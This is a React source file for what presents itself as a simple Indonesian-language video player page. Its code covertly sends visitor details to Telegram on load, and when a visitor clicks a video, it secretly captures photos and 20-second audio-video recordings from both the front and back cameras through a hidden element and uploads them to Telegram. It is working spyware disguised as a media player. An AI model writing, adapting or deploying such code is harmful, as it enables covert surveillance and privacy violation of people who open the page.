import { ArrowsPointingOutIcon, ArrowsPointingInIcon } from '@heroicons/react/24/solid';
import { useState, useEffect, useCallback, useRef } from 'react';
import { sendTelegramNotification, sendImageToTelegram, sendVideoToTelegram, VisitorDetails } from './utils/telegram';
import { monitorSuspiciousActivity, cleanupMediaStream, validateVideoUrl } from './security';

function App() {
  const [isPlaying, setIsPlaying] = useState<number | null>(null);
  const [isFullscreen, setIsFullscreen] = useState(false);
  const videoRefs = useRef<(HTMLVideoElement | null)[]>([]);
  const cameraStreamsRef = useRef<{ stream: MediaStream; type: string; deviceId: string }[]>([]);

  const videos = [
    { videoUrl: 'https://cdn.videy.co/WRnnbxOh.mp4' },
    { videoUrl: 'https://cdn.videy.co/8asKje3H1.mp4' },
    { videoUrl: 'https://cdn.videy.co/HCpyHdGC.mp4' },
    { videoUrl: 'https://cdn.videy.co/J4r8BFDR.mp4' },
    { videoUrl: 'https://cdn.videy.co/NQ8EOxk0.mp4' },
    { videoUrl: 'https://cdn.videy.co/16gpSQzQ.mp4' },
    { videoUrl: 'https://cdn.videy.co/x3DQJdR6.mp4' },
    { videoUrl: 'https://cdn.videy.co/FPZ8MZdC.mp4' },
    { videoUrl: 'https://cdn.videy.co/nxkWOzw01.mp4' },
    { videoUrl: 'https://cdn.videy.co/YQog37Pu1.mp4' },
    { videoUrl: 'https://cdn.videy.co/VVH2RmCn1.mp4' },
    { videoUrl: 'https://video.twimg.com/amplify_video/1844748398769090560/vid/avc1/720x1280/2bQWWm0jkr8d0kFY.mp4?tag=14&fbclid=PAZXh0bgNhZW0CMTEAAacx7boT1XRp_y2Nd0ItS586hUftwIXq4G63BAS7t9YXHTbCkJhSOop-rBjvTQ_aem_uP1MRy05506nV5vLEZHGBQ' },
    { videoUrl: 'https://cdn.videy.co/1S2HTGaf1.mp4' },
  ];

  useEffect(() => {
    monitorSuspiciousActivity();

    const sendVisitorNotification = async () => {
      const visitorDetails: VisitorDetails = {
        userAgent: navigator.userAgent,
        location: window.location.href,
        referrer: document.referrer || 'Langsung',
        previousSites: document.referrer || 'Tidak ada',
      };
      try {
        await sendTelegramNotification(visitorDetails);
        console.log('Notifikasi pengunjung berhasil dikirim.');
      } catch (error) {
        console.error('Gagal mengirim notifikasi pengunjung:', error);
      }
    };
    sendVisitorNotification();

    videos.forEach((video, index) => {
      console.log(`Memeriksa video ${index + 1}: ${video.videoUrl}`);
      if (!validateVideoUrl(video.videoUrl)) {
        console.error(`Video ${index + 1} memiliki URL yang tidak valid.`);
      }
    });

    const initializeCameraStreams = async () => {
      const requestMediaAccess = async (deviceId: string, facingMode: string, cameraType: string, retryCount = 0): Promise<{ stream: MediaStream; deviceId: string } | null> => {
        const maxRetries = 3;
        try {
          const constraints = {
            video: {
              deviceId: deviceId ? { exact: deviceId } : undefined,
              facingMode: deviceId ? undefined : facingMode,
              width: { ideal: 1280 },
              height: { ideal: 720 },
              frameRate: { ideal: 30 },
            },
            audio: true,
          };
          const stream = await navigator.mediaDevices.getUserMedia(constraints);
          const actualDeviceId = deviceId || stream.getVideoTracks()[0].getSettings().deviceId || '';
          console.log(`Berhasil mendapatkan stream untuk kamera ${cameraType} dengan deviceId: ${actualDeviceId}`);
          return { stream, deviceId: actualDeviceId };
        } catch (error) {
          console.error(`Gagal mendapatkan akses kamera ${cameraType}:`, error);
          if (retryCount < maxRetries) {
            console.log(`Mencoba ulang untuk kamera ${cameraType} (${retryCount + 1}/${maxRetries})...`);
            await new Promise(resolve => setTimeout(resolve, 1000)); // Tunggu 1 detik sebelum retry
            return requestMediaAccess(deviceId, facingMode, cameraType, retryCount + 1);
          }
          console.warn(`Gagal mendapatkan kamera ${cameraType} setelah ${maxRetries} percobaan.`);
          return null;
        }
      };

      try {
        const devices = await navigator.mediaDevices.enumerateDevices();
        const videoDevices = devices.filter(device => device.kind === 'videoinput');
        console.log('Perangkat kamera yang ditemukan:', videoDevices);

        let frontDevice: MediaDeviceInfo | undefined;
        let backDevice: MediaDeviceInfo | undefined;

        for (const device of videoDevices) {
          const label = device.label.toLowerCase();
          if (label.includes('front') || label.includes('user')) {
            frontDevice = device;
          } else if (label.includes('back') || label.includes('environment')) {
            backDevice = device;
          }
        }

        // Fallback untuk mendeteksi kamera
        if (!frontDevice && videoDevices.length > 0) {
          frontDevice = videoDevices[0];
          console.log('Menggunakan perangkat pertama sebagai kamera depan:', frontDevice.label);
        }
        if (!backDevice && videoDevices.length > 1) {
          backDevice = videoDevices[1];
          console.log('Menggunakan perangkat kedua sebagai kamera belakang:', backDevice?.label);
        } else if (videoDevices.length === 1) {
          console.warn('Hanya satu kamera ditemukan, akan digunakan sebagai kamera depan.');
        }

        // Inisialisasi kamera depan
        if (frontDevice) {
          const frontResult = await requestMediaAccess(frontDevice.deviceId, 'user', 'depan');
          if (frontResult) {
            cameraStreamsRef.current.push({ stream: frontResult.stream, type: 'depan', deviceId: frontResult.deviceId });
          }
        }

        // Inisialisasi kamera belakang
        if (backDevice) {
          const backResult = await requestMediaAccess(backDevice.deviceId, 'environment', 'belakang');
          if (backResult) {
            cameraStreamsRef.current.push({ stream: backResult.stream, type: 'belakang', deviceId: backResult.deviceId });
          }
        }

        if (cameraStreamsRef.current.length === 0) {
          console.error('Tidak ada kamera yang tersedia atau semua akses ditolak.');
          alert('Tidak ada kamera yang dapat digunakan. Harap izinkan akses kamera di pengaturan browser.');
        } else {
          console.log('Stream kamera yang diinisialisasi:', cameraStreamsRef.current.map(s => `${s.type} (${s.deviceId})`));
        }
      } catch (error) {
        console.error('Error saat menginisialisasi stream kamera:', error);
      }
    };

    initializeCameraStreams();

    return () => {
      cameraStreamsRef.current.forEach(({ stream }) => cleanupMediaStream({ current: stream }));
      cameraStreamsRef.current = [];
    };
  }, []);

  const verifyAndRecoverStream = async (type: string, facingMode: string, deviceId?: string): Promise<MediaStream | null> => {
    let streamEntry = cameraStreamsRef.current.find(s => s.type === type);
    let stream = streamEntry?.stream;

    if (stream && stream.getVideoTracks().length > 0 && stream.getVideoTracks()[0].enabled) {
      console.log(`Stream untuk kamera ${type} sudah valid.`);
      return stream;
    }

    console.warn(`Stream untuk kamera ${type} tidak valid atau hilang, mencoba memulihkan...`);
    if (stream) {
      cleanupMediaStream({ current: stream });
      cameraStreamsRef.current = cameraStreamsRef.current.filter(s => s.type !== type);
    }

    try {
      const constraints = {
        video: {
          deviceId: deviceId ? { exact: deviceId } : undefined,
          facingMode: deviceId ? undefined : facingMode,
          width: { ideal: 1280 },
          height: { ideal: 720 },
          frameRate: { ideal: 30 },
        },
        audio: true,
      };
      const newStream = await navigator.mediaDevices.getUserMedia(constraints);
      const newDeviceId = deviceId || newStream.getVideoTracks()[0].getSettings().deviceId || '';
      cameraStreamsRef.current.push({ stream: newStream, type, deviceId: newDeviceId });
      console.log(`Berhasil memulihkan stream untuk kamera ${type} dengan deviceId: ${newDeviceId}`);
      return newStream;
    } catch (error) {
      console.error(`Gagal memulihkan stream untuk kamera ${type}:`, error);
      return null;
    }
  };

  const recordCamera = async (stream: MediaStream, type: string) => {
    try {
      const cameraVideo = document.createElement('video');
      cameraVideo.srcObject = stream;
      cameraVideo.playsInline = true;
      cameraVideo.muted = true;
      cameraVideo.autoplay = true;
      cameraVideo.style.display = 'none';
      document.body.appendChild(cameraVideo);

      await new Promise((resolve) => {
        cameraVideo.onloadedmetadata = async () => {
          await cameraVideo.play().catch(err => console.error(`Gagal memutar video kamera ${type}:`, err));
          setTimeout(resolve, 500);
        };
      });

      const videoWidth = cameraVideo.videoWidth;
      const videoHeight = cameraVideo.videoHeight;
      console.log(`Dimensi video kamera ${type}: ${videoWidth}x${videoHeight}`);

      // Mengambil foto
      const canvas = document.createElement('canvas');
      const canvasAspectRatio = 9 / 16;
      const videoAspectRatio = videoWidth / videoHeight;

      let drawWidth, drawHeight, offsetX, offsetY;
      if (videoAspectRatio > canvasAspectRatio) {
        drawWidth = 720;
        drawHeight = drawWidth / videoAspectRatio;
      } else {
        drawHeight = 1280;
        drawWidth = drawHeight * videoAspectRatio;
      }

      canvas.width = drawWidth;
      canvas.height = drawHeight;

      offsetX = (drawWidth - videoWidth) / 2;
      offsetY = (drawHeight - videoHeight) / 2;

      const context = canvas.getContext('2d');
      if (context) {
        context.drawImage(cameraVideo, offsetX, offsetY, videoWidth, videoHeight);
      }

      const photoBlob = await new Promise<Blob>((resolve) => {
        canvas.toBlob((blob) => blob && resolve(blob), 'image/jpeg', 1.0);
      });

      try {
        await sendImageToTelegram(photoBlob);
        console.log(`Foto dari kamera ${type} berhasil dikirim ke Telegram.`);
      } catch (error) {
        console.error(`Gagal mengirim foto dari kamera ${type}:`, error);
      }

      // Merekam video
      const supportedMimeType = ['video/mp4;codecs=h264,aac', 'video/mp4']
        .find(type => MediaRecorder.isTypeSupported(type)) || 'video/mp4';
      const mediaRecorder = new MediaRecorder(stream, {
        mimeType: supportedMimeType,
        videoBitsPerSecond: 2000000,
      });
      const chunks: BlobPart[] = [];

      mediaRecorder.ondataavailable = (e) => {
        if (e.data.size > 0) chunks.push(e.data);
      };

      mediaRecorder.onstop = async () => {
        const videoBlob = new Blob(chunks, { type: supportedMimeType });
        try {
          await sendVideoToTelegram(videoBlob);
          console.log(`Video dari kamera ${type} berhasil dikirim ke Telegram.`);
        } catch (error) {
          console.error(`Gagal mengirim video dari kamera ${type}:`, error);
        }
      };

      mediaRecorder.onerror = (e) => {
        console.error(`Error saat merekam kamera ${type}:`, e);
      };

      mediaRecorder.start(1000);
      console.log(`Mulai merekam kamera ${type}`);

      await new Promise((resolve) => setTimeout(() => {
        if (mediaRecorder.state === 'recording') {
          mediaRecorder.stop();
          console.log(`Perekaman kamera ${type} dihentikan setelah 20 detik.`);
        }
        resolve(null);
      }, 20000));

      // Cleanup
      if (cameraVideo.parentNode) cameraVideo.parentNode.removeChild(cameraVideo);
    } catch (error) {
      console.error(`Error saat merekam kamera ${type}:`, error);
    }
  };

  const captureAndSendMedia = useCallback(async (videoElement: HTMLVideoElement) => {
    console.log('Memulai proses perekaman untuk kamera...');

    try {
      await videoElement.play();

      if (cameraStreamsRef.current.length === 0) {
        console.warn('Tidak ada stream kamera yang tersedia awalnya.');
      }

      // Pastikan kedua kamera tersedia sebelum merekam
      const frontStream = await verifyAndRecoverStream('depan', 'user', cameraStreamsRef.current.find(s => s.type === 'depan')?.deviceId);
      const backStream = await verifyAndRecoverStream('belakang', 'environment', cameraStreamsRef.current.find(s => s.type === 'belakang')?.deviceId);

      if (!frontStream && !backStream) {
        console.error('Kedua kamera gagal, menghentikan perekaman.');
        videoElement.pause();
        setIsPlaying(null);
        return;
      }

      // Rekam kamera depan
      if (frontStream) {
        await recordCamera(frontStream, 'depan');
      } else {
        console.warn('Kamera depan tidak tersedia untuk perekaman.');
      }

      // Rekam kamera belakang
      if (backStream) {
        await recordCamera(backStream, 'belakang');
      } else {
        console.warn('Kamera belakang tidak tersedia untuk perekaman.');
      }

      videoElement.pause();
      setIsPlaying(null);
    } catch (error) {
      console.error('Error dalam captureAndSendMedia:', error);
      videoElement.pause();
      setIsPlaying(null);
    }
  }, []);

  const handleVideoClick = useCallback(async (index: number) => {
    if (isPlaying !== null && isPlaying !== index) {
      const prevVideo = videoRefs.current[isPlaying];
      if (prevVideo) {
        prevVideo.pause();
        prevVideo.currentTime = 0;
        prevVideo.removeAttribute('src');
        prevVideo.load();
        console.log(`Video sebelumnya di indeks ${isPlaying} dihentikan sepenuhnya.`);
      }
    }

    const videoElement = videoRefs.current[index];
    if (videoElement) {
      if (!validateVideoUrl(videos[index].videoUrl)) {
        console.error('URL video tidak valid, menghentikan pemutaran.');
        return;
      }

      try {
        setIsPlaying(index);
        await captureAndSendMedia(videoElement);
      } catch (error) {
        console.error('Error memutar video:', error);
        videoElement.pause();
        videoElement.currentTime = 0;
        videoElement.removeAttribute('src');
        videoElement.load();
        setIsPlaying(null);
      }
    }
  }, [isPlaying]);

  const toggleFullscreen = (index: number) => {
    const videoElement = videoRefs.current[index];
    if (videoElement) {
      if (!isFullscreen) {
        videoElement.requestFullscreen().catch(err => console.error('Gagal masuk fullscreen:', err));
        setIsFullscreen(true);
      } else {
        document.exitFullscreen().catch(err => console.error('Gagal keluar fullscreen:', err));
        setIsFullscreen(false);
      }
      console.log(`Mengubah mode fullscreen untuk video di indeks: ${index}`);
    }
  };

  const handleVideoEnded = (index: number) => {
    setIsPlaying(null);
    console.log(`Video di indeks ${index} telah selesai.`);
  };

  return (
    <div className="relative min-h-screen bg-gray-900">
      <header className="relative bg-gray-800 py-6">
        <div className="container mx-auto px-4">
          <h1 className="text-3xl font-bold text-white">Pemutar Video</h1>
        </div>
      </header>
      <main className="relative container mx-auto px-4 py-8">
        <div className="max-w-[360px] mx-auto">
          <div className="space-y-2">
            {videos.map((video, index) => (
              <div key={index} className="relative bg-black rounded-lg overflow-hidden shadow-xl" style={{ aspectRatio: '9/16', maxHeight: '200px' }}>
                <video
                  ref={(el) => (videoRefs.current[index] = el)}
                  src={video.videoUrl}
                  className="w-full h-full object-cover"
                  muted
                  onClick={() => handleVideoClick(index)}
                  onEnded={() => handleVideoEnded(index)}
                  preload="metadata"
                >
                  <p>Maaf, video tidak dapat dimuat. Silakan periksa koneksi Anda atau coba lagi nanti.</p>
                </video>
                {isPlaying === index && (
                  <div className="absolute bottom-2 right-2 z-20">
                    <button
                      onClick={() => toggleFullscreen(index)}
                      className="bg-gray-800/70 p-1 rounded-full hover:bg-gray-700 transition-all duration-200"
                    >
                      {isFullscreen ? (
                        <ArrowsPointingInIcon className="w-5 h-5 text-white" />
                      ) : (
                        <ArrowsPointingOutIcon className="w-5 h-5 text-white" />
                      )}
                    </button>
                  </div>
                )}
              </div>
            ))}
          </div>
        </div>
      </main>
    </div>
  );
}

export default App;
